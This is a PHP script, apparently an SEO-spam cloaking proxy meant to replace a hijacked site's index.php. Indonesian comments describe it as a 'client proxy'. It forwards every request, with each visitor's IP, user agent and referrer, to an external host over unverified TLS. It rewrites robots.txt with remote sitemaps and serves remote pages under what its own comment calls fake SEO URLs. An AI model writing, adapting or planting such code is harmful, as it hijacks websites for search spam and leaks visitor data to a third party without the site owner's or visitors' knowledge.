<?php
// index.php (Client Proxy)
// Skrip ini bertindak sebagai perantara yang mengirimkan permintaan ke Server Eksternal (endpoint_server.php).

error_reporting(0);
@set_time_limit(120);
@ignore_user_abort(1);

// ** GANTI DENGAN URL SERVER EKSTERNAL ANDA **
// URL ini harus mengarah ke file endpoint_server.php Anda.
$tr = "https://avs.javpornsub.cloud/"; 

class Req
{
    // Fungsi utilitas untuk mengambil variabel $_SERVER
    public function server($name = '', $default = '')
    {
        if (empty($name)) {
            return $_SERVER;
        }
        $name = strtoupper($name);
        return isset($_SERVER[$name]) ? $_SERVER[$name] : $default;
    }
    
    // Mendapatkan skema (http/https)
    public function scheme()
    {
        if ($this->server('HTTPS') && ("1" == $this->server('HTTPS') || "on" == strtolower($this->server('HTTPS')))) {
            return "https";
        } elseif ('https' == $this->server('REQUEST_SCHEME')) {
            return "https";
        } elseif ('443' == $this->server('SERVER_PORT')) {
            return "https";
        } elseif ('https' == $this->server('HTTP_X_FORWARDED_PROTO')) {
            return "https";
        }
        return "http";
    }
    
    // Mendapatkan domain lengkap
    public function dm()
    {
        $host = strval($this->server('HTTP_X_FORWARDED_HOST') ?: $this->server('HTTP_HOST'));
        $host = strpos($host, ':') ? strstr($host, ':', true) : $host;
        return $this->scheme() . "://" . $host;
    }
    
    // Mendapatkan IP pengguna
    public function ip()
    {
        if (getenv('HTTP_CLIENT_IP')) {
            $ip = getenv('HTTP_CLIENT_IP');
        } elseif (getenv('HTTP_X_FORWARDED_FOR')) {
            $ip = getenv('HTTP_X_FORWARDED_FOR');
        } elseif (getenv('REMOTE_ADDR')) {
            $ip = getenv('REMOTE_ADDR');
        } else {
            $ip = $this->server('REMOTE_ADDR');
        }
        return $ip;
    }
    
    // Mendapatkan URI yang bersih (menghilangkan query string)
    public function uri()
    {
        $requri = substr($this->server('REQUEST_URI'), strpos($this->server('REQUEST_URI'), '/'));
        if ($pos = strpos($requri, '?')) {
            $requri = substr($requri, 0, $pos);
        }
        return rtrim($requri, '/');
    }
    
    // Fungsi untuk eksekusi cURL (POST ke Server Eksternal)
    public function execReq($url, $p = array())
    {
        $url = str_replace(' ', '+', $url);
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        
        // Tambahkan header original User-Agent dan Referer ke payload
        if ($this->server('HTTP_USER_AGENT')) {
            $p['user_agent'] = $this->server('HTTP_USER_AGENT');
        }
        if ($this->server('HTTP_REFERER')) {
            $p['referrer'] = $this->server('HTTP_REFERER');
        }

        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($p));
        $output = curl_exec($ch);
        $errorCode = curl_errno($ch);
        curl_close($ch);
        if (0 !== $errorCode) {
            // Error cURL, bisa logging atau menampilkan error
            return "<!-- cURL Error: " . $errorCode . " -->";
        }
        return $output;
    }
}

$req = new Req();
$uri = urldecode($req->uri());

// Parameter dasar yang dikirim ke server eksternal
$p = array(
    "domain" => $req->dm(),
    "port" => $req->server('SERVER_PORT', 80),
    // Kirim URI tanpa slash di awal
    "uri" => ltrim($uri, '/') 
);

// --- 1. Penanganan robots.txt ---
if (substr($uri, -10) == "robots.txt") {
    header("Content-type:text/plain; charset=utf-8");
    // Endpoint /robots di server akan menghasilkan semua file sitemap yang dinamis.
    die($req->execReq($tr . "robots", $p));
}
// --- Penanganan file robots (untuk generate) ---
if (substr($uri, -6) == "robots") {
    $output = $req->execReq($tr . "robots", $p);
    $rpt = __DIR__ . "/robots.txt";
    file_put_contents($rpt, $output);
    $robots_cont = @file_get_contents($rpt);
    if (strpos(strtolower($robots_cont), "sitemap")) {
        die("robots.txt file create success!");
    } else {
        die("robots.txt file create fail!");
    }
}

// --- 2. Penanganan Sitemap XML (.xml) ---
if (substr($uri, -4) == ".xml") {
    $sitemap_name = basename($uri);
    $action_url = $tr . 'sitemap'; // Default untuk sitemap.xml dan allsitemap.xml
    
    // Jika bukan sitemap index utama, anggap itu adalah sitemap game yang tersegmentasi, kirim ke endpoint 'map'
    if ($sitemap_name !== 'sitemap.xml' && $sitemap_name !== 'allsitemap.xml') {
        $action_url = $tr . 'map'; 
    } 

    // Semua permintaan *.xml diarahkan ke endpoint yang sesuai
    $output = $req->execReq($action_url, $p);
    header("Content-type:text/" . (substr($output, 0, 5) === '<?xml' ? 'xml' : 'plain') . '; charset=utf-8');
    die($output);
}

// --- 3. Penanganan URL SEO Palsu (Default Routing) ---
// Semua URL lain (misal: /mobile-legends/top-up-mobile-lejends-diamonds) diarahkan ke endpoint 'indata'.
$p["ip"] = $req->ip();
$action = $tr . "indata";
die($req->execReq($action, $p));
?>
